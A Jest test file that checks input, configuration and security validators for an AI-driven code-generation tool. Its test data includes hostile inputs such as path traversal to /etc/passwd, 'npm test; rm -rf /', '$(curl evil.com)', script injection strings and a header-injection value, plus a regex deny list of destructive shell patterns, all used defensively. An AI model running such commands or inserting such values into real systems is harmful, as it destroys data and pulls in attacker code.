#!/usr/bin/env node
/**
 * Test missing validation scenarios from commit ca2c369
 * Tests input validation, configuration validation, and security considerations
 */

const fs = require('fs');
const path = require('path');

describe('Validation Issues Analysis', () => {
  describe('Input Validation', () => {
    test('should validate API key format and presence', () => {
      const validateApiKey = (apiKey) => {
        if (!apiKey) return { valid: false, error: 'API key is required' };
        if (typeof apiKey !== 'string') return { valid: false, error: 'API key must be a string' };
        if (apiKey.length < 10) return { valid: false, error: 'API key too short' };
        if (apiKey.includes(' ')) return { valid: false, error: 'API key contains invalid characters' };
        return { valid: true };
      };
      
      // Test cases that should fail validation
      expect(validateApiKey(undefined).valid).toBe(false);
      expect(validateApiKey(null).valid).toBe(false);
      expect(validateApiKey('').valid).toBe(false);
      expect(validateApiKey(123).valid).toBe(false);
      expect(validateApiKey('short').valid).toBe(false);
      expect(validateApiKey('key with spaces').valid).toBe(false);
      
      // Valid case
      expect(validateApiKey('sk-valid-api-key-here').valid).toBe(true);
    });

    test('should validate URL format for base URLs', () => {
      const validateBaseUrl = (url) => {
        if (!url) return { valid: false, error: 'Base URL is required' };
        try {
          const parsed = new URL(url);
          if (!['http:', 'https:'].includes(parsed.protocol)) {
            return { valid: false, error: 'URL must use HTTP or HTTPS' };
          }
          return { valid: true };
        } catch {
          return { valid: false, error: 'Invalid URL format' };
        }
      };
      
      // Invalid cases
      expect(validateBaseUrl('').valid).toBe(false);
      expect(validateBaseUrl('not-a-url').valid).toBe(false);
      expect(validateBaseUrl('ftp://example.com').valid).toBe(false);
      expect(validateBaseUrl('javascript:alert(1)').valid).toBe(false);
      
      // Valid cases
      expect(validateBaseUrl('https://api.openrouter.ai').valid).toBe(true);
      expect(validateBaseUrl('http://localhost:3000').valid).toBe(true);
    });

    test('should validate model names', () => {
      const validateModel = (model) => {
        if (!model) return { valid: false, error: 'Model name is required' };
        if (typeof model !== 'string') return { valid: false, error: 'Model name must be a string' };
        if (model.includes('..')) return { valid: false, error: 'Model name contains invalid path traversal' };
        if (!/^[a-zA-Z0-9\/_.-]+$/.test(model)) return { valid: false, error: 'Model name contains invalid characters' };
        return { valid: true };
      };
      
      // Invalid cases
      expect(validateModel('').valid).toBe(false);
      expect(validateModel('../../../etc/passwd').valid).toBe(false);
      expect(validateModel('model with spaces').valid).toBe(false);
      expect(validateModel('model<script>alert(1)</script>').valid).toBe(false);
      
      // Valid cases
      expect(validateModel('anthropic/claude-3.5-sonnet').valid).toBe(true);
      expect(validateModel('gpt-4').valid).toBe(true);
      expect(validateModel('local-model_v1.0').valid).toBe(true);
    });

    test('should validate file paths for security', () => {
      const validateFilePath = (filePath) => {
        if (!filePath) return { valid: false, error: 'File path is required' };
        if (typeof filePath !== 'string') return { valid: false, error: 'File path must be a string' };
        if (filePath.includes('..')) return { valid: false, error: 'Path traversal not allowed' };
        if (filePath.includes('\0')) return { valid: false, error: 'Null bytes not allowed' };
        if (filePath.startsWith('/etc/') || filePath.startsWith('/proc/') || filePath.startsWith('/sys/')) {
          return { valid: false, error: 'Access to system directories not allowed' };
        }
        if (filePath.length > 255) return { valid: false, error: 'Path too long' };
        return { valid: true };
      };
      
      // Security risks
      expect(validateFilePath('../../../etc/passwd').valid).toBe(false);
      expect(validateFilePath('/etc/shadow').valid).toBe(false);
      expect(validateFilePath('file\0name').valid).toBe(false);
      expect(validateFilePath('/proc/self/environ').valid).toBe(false);
      expect(validateFilePath('a'.repeat(300)).valid).toBe(false);
      
      // Valid paths
      expect(validateFilePath('src/components/Button.js').valid).toBe(true);
      expect(validateFilePath('./local-file.txt').valid).toBe(true);
    });

    test('should validate streaming options', () => {
      const validateStreamingOptions = (options) => {
        const errors = [];
        
        if (options.timeout && (typeof options.timeout !== 'number' || options.timeout <= 0)) {
          errors.push('Timeout must be a positive number');
        }
        
        if (options.maxTokens && (typeof options.maxTokens !== 'number' || options.maxTokens <= 0 || options.maxTokens > 100000)) {
          errors.push('Max tokens must be between 1 and 100000');
        }
        
        if (options.temperature !== undefined && (typeof options.temperature !== 'number' || options.temperature < 0 || options.temperature > 2)) {
          errors.push('Temperature must be between 0 and 2');
        }
        
        return { valid: errors.length === 0, errors };
      };
      
      // Invalid options
      expect(validateStreamingOptions({ timeout: -1 }).valid).toBe(false);
      expect(validateStreamingOptions({ maxTokens: 0 }).valid).toBe(false);
      expect(validateStreamingOptions({ maxTokens: 200000 }).valid).toBe(false);
      expect(validateStreamingOptions({ temperature: -1 }).valid).toBe(false);
      expect(validateStreamingOptions({ temperature: 3 }).valid).toBe(false);
      
      // Valid options
      expect(validateStreamingOptions({ timeout: 30000 }).valid).toBe(true);
      expect(validateStreamingOptions({ maxTokens: 4000, temperature: 0.7 }).valid).toBe(true);
    });
  });

  describe('Configuration Validation', () => {
    test('should validate environment variables are properly set', () => {
      const validateEnvironment = () => {
        const errors = [];
        const warnings = [];
        
        // Check required environment variables
        if (!process.env.ANTHROPIC_API_KEY && !process.env.OPENROUTER_API_KEY) {
          errors.push('Either ANTHROPIC_API_KEY or OPENROUTER_API_KEY must be set');
        }
        
        // Check for potentially problematic configurations
        if (process.env.NODE_ENV === 'production' && process.env.DEBUG === 'true') {
          warnings.push('Debug mode enabled in production');
        }
        
        if (process.env.YOLO === 'true' && !process.env.CI) {
          warnings.push('YOLO mode enabled outside CI environment');
        }
        
        return { errors, warnings };
      };
      
      // Save original env
      const originalEnv = { ...process.env };
      
      // Test missing API keys
      delete process.env.ANTHROPIC_API_KEY;
      delete process.env.OPENROUTER_API_KEY;
      
      let result = validateEnvironment();
      expect(result.errors).toContain('Either ANTHROPIC_API_KEY or OPENROUTER_API_KEY must be set');
      
      // Test warning conditions
      process.env.NODE_ENV = 'production';
      process.env.DEBUG = 'true';
      
      result = validateEnvironment();
      expect(result.warnings).toContain('Debug mode enabled in production');
      
      // Restore original env
      process.env = originalEnv;
    });

    test('should validate streaming client configuration', () => {
      const validateStreamingConfig = (config) => {
        const errors = [];
        
        if (!config.apiKey) {
          errors.push('API key is required');
        }
        
        if (config.enableStreaming === true && !global.fetch) {
          errors.push('Fetch API not available for streaming');
        }
        
        if (config.baseUrl && !isValidUrl(config.baseUrl)) {
          errors.push('Invalid base URL');
        }
        
        if (config.model && typeof config.model !== 'string') {
          errors.push('Model must be a string');
        }
        
        return { valid: errors.length === 0, errors };
      };
      
      const isValidUrl = (url) => {
        try {
          new URL(url);
          return true;
        } catch {
          return false;
        }
      };
      
      // Invalid configurations
      expect(validateStreamingConfig({}).valid).toBe(false);
      expect(validateStreamingConfig({ apiKey: 'test', baseUrl: 'invalid' }).valid).toBe(false);
      expect(validateStreamingConfig({ apiKey: 'test', model: 123 }).valid).toBe(false);
      
      // Valid configuration
      expect(validateStreamingConfig({
        apiKey: 'valid-key',
        baseUrl: 'https://api.example.com',
        model: 'test-model'
      }).valid).toBe(true);
    });
  });

  describe('Content Validation', () => {
    test('should validate generated file content for safety', () => {
      const validateFileContent = (content, filePath) => {
        const warnings = [];
        const errors = [];
        
        // Check for potential security issues
        if (content.includes('eval(') || content.includes('Function(')) {
          warnings.push('Content contains potentially dangerous eval statements');
        }
        
        if (content.match(/password|secret|token|key/i) && !filePath.includes('test')) {
          warnings.push('Content may contain sensitive information');
        }
        
        // Check for malformed code
        if (filePath.endsWith('.js')) {
          const openBraces = (content.match(/\{/g) || []).length;
          const closeBraces = (content.match(/\}/g) || []).length;
          if (openBraces !== closeBraces) {
            errors.push('Mismatched braces in JavaScript file');
          }
        }
        
        if (filePath.endsWith('.json')) {
          try {
            JSON.parse(content);
          } catch {
            errors.push('Invalid JSON content');
          }
        }
        
        return { errors, warnings };
      };
      
      // Dangerous content
      let result = validateFileContent('eval(userInput)', 'script.js');
      expect(result.warnings).toContain('Content contains potentially dangerous eval statements');
      
      // Sensitive content
      result = validateFileContent('const apiKey = "secret-key"', 'config.js');
      expect(result.warnings.some(w => w.includes('sensitive information'))).toBe(true);
      
      // Malformed JavaScript
      result = validateFileContent('function test() { if (true) { console.log("test");', 'broken.js');
      expect(result.errors).toContain('Mismatched braces in JavaScript file');
      
      // Invalid JSON
      result = validateFileContent('{ invalid json }', 'data.json');
      expect(result.errors).toContain('Invalid JSON content');
      
      // Valid content
      result = validateFileContent('console.log("Hello World");', 'hello.js');
      expect(result.errors).toHaveLength(0);
    });

    test('should validate SSE response format', () => {
      const validateSSEResponse = (chunk) => {
        const errors = [];
        
        if (!chunk.startsWith('data: ')) {
          errors.push('SSE chunk must start with "data: "');
        }
        
        const data = chunk.slice(6);
        if (data !== '[DONE]') {
          try {
            const parsed = JSON.parse(data);
            if (!parsed.choices && !parsed.delta) {
              errors.push('SSE data missing required fields');
            }
          } catch {
            errors.push('SSE data is not valid JSON');
          }
        }
        
        return { valid: errors.length === 0, errors };
      };
      
      // Invalid SSE chunks
      expect(validateSSEResponse('invalid chunk').valid).toBe(false);
      expect(validateSSEResponse('data: {invalid json}').valid).toBe(false);
      expect(validateSSEResponse('data: {"missing":"required_fields"}').valid).toBe(false);
      
      // Valid SSE chunks
      expect(validateSSEResponse('data: [DONE]').valid).toBe(true);
      expect(validateSSEResponse('data: {"choices":[{"delta":{"content":"test"}}]}').valid).toBe(true);
    });

    test('should validate file parsing format', () => {
      const validateFileFormat = (content) => {
        const errors = [];
        const files = [];
        
        const fileMatches = content.match(/=== FILENAME: (.+?) ===/g);
        const endMatches = content.match(/=== END: (.+?) ===/g);
        
        if (fileMatches && endMatches && fileMatches.length !== endMatches.length) {
          errors.push('Mismatched file start and end markers');
        }
        
        if (fileMatches) {
          for (const match of fileMatches) {
            const fileName = match.match(/=== FILENAME: (.+?) ===/)[1];
            
            // Validate filename
            if (fileName.includes('..')) {
              errors.push(`Path traversal in filename: ${fileName}`);
            }
            
            if (fileName.length > 255) {
              errors.push(`Filename too long: ${fileName}`);
            }
            
            files.push(fileName);
          }
        }
        
        return { valid: errors.length === 0, errors, files };
      };
      
      // Invalid file format
      let result = validateFileFormat(`
=== FILENAME: test.js ===
content
=== FILENAME: another.js ===
more content
`); // Missing end markers
      expect(result.valid).toBe(false);
      
      // Path traversal
      result = validateFileFormat(`
=== FILENAME: ../../../etc/passwd ===
malicious content
=== END: ../../../etc/passwd ===
`);
      expect(result.errors.some(e => e.includes('Path traversal'))).toBe(true);
      
      // Valid format
      result = validateFileFormat(`
=== FILENAME: src/component.js ===
console.log("Hello");
=== END: src/component.js ===
`);
      expect(result.valid).toBe(true);
      expect(result.files).toContain('src/component.js');
    });
  });

  describe('Security Validation', () => {
    test('should prevent code injection in eval scripts', () => {
      const validateEvalScript = (script) => {
        const dangers = [];
        
        // Check for command injection patterns
        const dangerousPatterns = [
          /;\s*rm\s+-rf/,
          /&&\s*rm\s+/,
          /\|\s*rm\s+/,
          /\$\(.*\)/,
          /`.*`/,
          /eval\s*\(/,
          /exec\s*\(/,
          /system\s*\(/
        ];
        
        for (const pattern of dangerousPatterns) {
          if (pattern.test(script)) {
            dangers.push(`Potentially dangerous pattern: ${pattern.source}`);
          }
        }
        
        return { safe: dangers.length === 0, dangers };
      };
      
      // Dangerous scripts
      expect(validateEvalScript('npm test; rm -rf /').safe).toBe(false);
      expect(validateEvalScript('echo "test" && rm file').safe).toBe(false);
      expect(validateEvalScript('eval(userInput)').safe).toBe(false);
      expect(validateEvalScript('$(curl evil.com)').safe).toBe(false);
      
      // Safe scripts
      expect(validateEvalScript('npm test').safe).toBe(true);
      expect(validateEvalScript('echo "Hello World"').safe).toBe(true);
    });

    test('should validate headers for security', () => {
      const validateHeaders = (headers) => {
        const issues = [];
        
        // Check for missing security headers
        if (!headers['HTTP-Referer']) {
          issues.push('Missing HTTP-Referer header');
        }
        
        if (!headers['X-Title']) {
          issues.push('Missing X-Title header');
        }
        
        // Check for potential header injection
        for (const [key, value] of Object.entries(headers)) {
          if (value.includes('\n') || value.includes('\r')) {
            issues.push(`Header injection detected in ${key}`);
          }
        }
        
        return { secure: issues.length === 0, issues };
      };
      
      // Insecure headers
      let result = validateHeaders({
        'Authorization': 'Bearer token',
        'Content-Type': 'application/json'
      });
      expect(result.secure).toBe(false);
      expect(result.issues).toContain('Missing HTTP-Referer header');
      
      // Header injection
      result = validateHeaders({
        'Authorization': 'Bearer token\nX-Injected: malicious'
      });
      expect(result.issues.some(i => i.includes('Header injection'))).toBe(true);
      
      // Secure headers
      result = validateHeaders({
        'Authorization': 'Bearer token',
        'Content-Type': 'application/json',
        'HTTP-Referer': 'https://github.com/project',
        'X-Title': 'Berrry Committer'
      });
      expect(result.secure).toBe(true);
    });

    test('should validate rate limiting and resource usage', () => {
      const validateResourceUsage = (options) => {
        const warnings = [];
        
        if (options.maxTokens > 10000) {
          warnings.push('Very high token limit may cause excessive costs');
        }
        
        if (options.concurrentRequests > 5) {
          warnings.push('High concurrent requests may trigger rate limiting');
        }
        
        if (options.timeout < 1000) {
          warnings.push('Very short timeout may cause premature failures');
        }
        
        if (options.retryAttempts > 10) {
          warnings.push('Too many retry attempts may cause extended delays');
        }
        
        return { warnings };
      };
      
      // Resource abuse scenarios
      let result = validateResourceUsage({ maxTokens: 50000 });
      expect(result.warnings).toContain('Very high token limit may cause excessive costs');
      
      result = validateResourceUsage({ concurrentRequests: 20 });
      expect(result.warnings).toContain('High concurrent requests may trigger rate limiting');
      
      // Reasonable usage
      result = validateResourceUsage({ 
        maxTokens: 4000, 
        concurrentRequests: 2, 
        timeout: 30000,
        retryAttempts: 3
      });
      expect(result.warnings).toHaveLength(0);
    });
  });
});

module.exports = {
  // Export validation functions for reuse
};